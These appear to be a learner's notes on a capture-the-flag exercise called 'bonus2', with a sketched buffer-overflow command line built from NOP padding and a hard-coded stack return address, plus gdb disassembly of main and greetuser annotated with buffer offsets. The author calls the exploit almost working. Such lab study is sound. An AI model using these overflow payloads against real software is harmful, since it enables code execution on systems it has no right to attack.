...
# sketch solution (it actually works with gdb, makes me think that it is almost there)
...
./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 22 + '\xa2\xfe\xff\xbf'")
...
Dump of assembler code for function main:
   ...
   0x0804855a <+49>:	   rep stos %eax,%es:(%edi)				; for ecx repetitions (19) stores the contents of eax (0) into where edi points to, incrementing or decrementing edi (depending on the direction flag) by 4 bytes each time   ----> that means bzero(0xbffff690,76)
...
Dump of assembler code for function greetuser:
   ...
   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax          ; eax = ebp - 72 (== esp + 16)
   0x080484a5 <+33>:	mov    (%edx),%ecx               ; ecx = *edx
   0x080484a7 <+35>:	mov    %ecx,(%eax)               ; eax = ecx
   ...
   0x080484ba <+54>:	mov    $0x8048717,%edx           ; edx = hello in finnish
   ...
   0x080484e9 <+101>:	mov    $0x804872a,%edx        ; edx = hello in dutch
   ...
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax       ; eax = ebp - 72 (apparentlly esp + 24?)
